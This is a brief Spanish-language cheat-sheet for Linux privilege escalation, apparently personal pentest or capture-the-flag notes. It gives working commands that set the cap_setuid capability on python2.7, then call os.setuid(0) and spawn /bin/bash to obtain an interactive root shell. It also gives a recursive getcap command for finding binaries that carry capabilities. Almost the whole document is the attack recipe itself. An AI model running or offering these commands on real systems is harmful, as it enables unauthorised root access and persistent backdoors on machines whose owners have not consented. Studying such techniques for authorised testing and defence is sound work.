** Modificar capabilities a python2.7 para conseguir una shell interactiva como root **
Capability que da la capacidad a python2.7 de modificar el SUID de otros binarios.
> Modificar capability: `setcap cap_setuid*ep /usr/bin/python2.7`
> Iniciar sesión interactiva con python2.7: `python2.7`
> Comandos para obtener shell interactiva como root:
> `import os`
> `os.setuid(0)`
> `os.system("/bin/bash")`

** Ver capabilities asociadas de forma recursiva **
`getcap -r / 2>/dev/null`

